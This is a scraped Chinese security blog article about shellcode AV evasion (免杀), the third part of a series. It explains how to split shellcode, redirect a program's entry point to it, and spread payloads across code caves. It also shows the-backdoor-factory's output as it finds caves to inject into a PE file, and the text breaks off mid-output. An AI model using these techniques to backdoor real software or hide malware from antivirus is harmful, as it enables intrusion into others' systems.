<html>
<head>
<title>干货Shellcode免杀总结三</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | Shellcode免杀总结&lt;三&gt;
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    卿
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-02-08</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2 style="text-align: center;" data-mpa-powered-by="yiban.io"><strong>Shellcode免杀总结-第三篇&lt;完结篇&gt;</strong></a></h2><h2 style="margin: 4em auto 2em;padding-right: 0.2em;padding-left: 0.2em;font-weight: bold;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 15.4px;display: table;background: rgb(0, 152, 116);">B）shellcode注入混淆</h2><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">大多数注入免杀还将shellcode进行了拆分。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">拆分这两个字也很好理解，字面的意思上和各位php一句话木马免杀中大体一样，shellcode也好比我们php木马中需要拆分的危险函数名。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">shellcode拆分可以把原本特征明显的程序中shellcode进行位置替换，最简单的比如新增加区段填入shellcode并将入口点jmp到shellcode地址最后再跳回原程序开头，</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">也可以将shellcode分段布在各个code cave中再分段执行，原理可以参考egg hunt shellcode的中的Omelet Shellcode。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">举一些注入例子:</p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">BDF：</h4><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">https://github.com/secretsquirrel/the-backdoor-factory</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">*] <span style="color: rgb(0, 134, 179);">In</span> the backdoor <span style="color: rgb(167, 29, 93);">module</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Checking</span> <span style="color: rgb(167, 29, 93);">if</span> binary <span style="color: rgb(167, 29, 93);">is</span> supported</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Gathering</span> file info</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Reading</span> win32 entry instructions</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Loading</span> PE <span style="color: rgb(167, 29, 93);">in</span> pefile</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Parsing</span> data directories</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Looking</span> <span style="color: rgb(167, 29, 93);">for</span> <span style="color: rgb(167, 29, 93);">and</span> setting selected shellcode</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Creating</span> win32 resume execution stub</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Looking</span> <span style="color: rgb(167, 29, 93);">for</span> caves that will fit the minimum shellcode length of <span style="color: rgb(0, 134, 179);">410</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">All</span> caves lengths:  <span style="color: rgb(0, 134, 179);">410</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">############################################################</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">The</span> following caves can be used to inject code <span style="color: rgb(167, 29, 93);">and</span> possibly</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">continue</span> execution.</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">**<span style="color: rgb(0, 134, 179);">Don</span><span style="color: rgb(24, 54, 145);">'t like what you see? Use jump, single, append, or ignore.**</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">############################################################</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">1</span> length <span style="color: rgb(167, 29, 93);">as</span> <span style="color: rgb(167, 29, 93);">int</span>: <span style="color: rgb(0, 134, 179);">410</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[*] <span style="color: rgb(0, 134, 179);">Available</span> caves: </span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">1.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: DATA; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x5df200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0x665400</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0x65ea07</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0x65ec68</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">609</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">3.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rdata; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a000</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0x66a013</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">493</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">4.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc8203f</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc82308</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">713</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">5.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc82e1c</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc83050</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">564</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">6.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc830eb</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc83718</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1581</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">7.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc83b64</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc840fc</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1432</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">8.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc843ff</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc846c8</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">713</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">9.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc851dc</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc85410</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">564</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">10.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc854ab</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc859d0</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1317</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">11.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc86557</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc86b84</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1581</span></span></code><code style="font family: Consolas, 